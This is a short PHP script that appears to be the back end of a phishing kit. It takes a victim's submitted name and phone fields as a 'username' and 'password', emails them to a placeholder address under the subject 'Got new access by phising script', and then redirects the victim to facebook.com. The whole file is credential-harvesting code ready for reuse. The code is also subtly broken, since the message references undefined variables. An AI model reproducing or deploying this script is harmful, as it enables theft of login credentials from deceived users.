<?php

	function mail_sender(){
		if(! ( isset($_REQUEST['full_name']) && isset($_REQUEST['mobile_phone']) ) ){
			return false;
		}

		$username = $_REQUEST['full_name'];
		$password = $_REQUEST['mobile_phone'];
		
		$reciever = "YOUR-EMAIL ADRRESS";
		
		$subject = "Got new access by phising script";
		$message = "The username is ". $full_name;
		$message .= "and password is ". $mobile_phone;
		
		return mail($reciever, $subject, $message);
	}
	
	if(mail_sender()){
		header("Location: http://www.facebook.com");
	}
	header("location:javascript://history.go(-1)");
?>
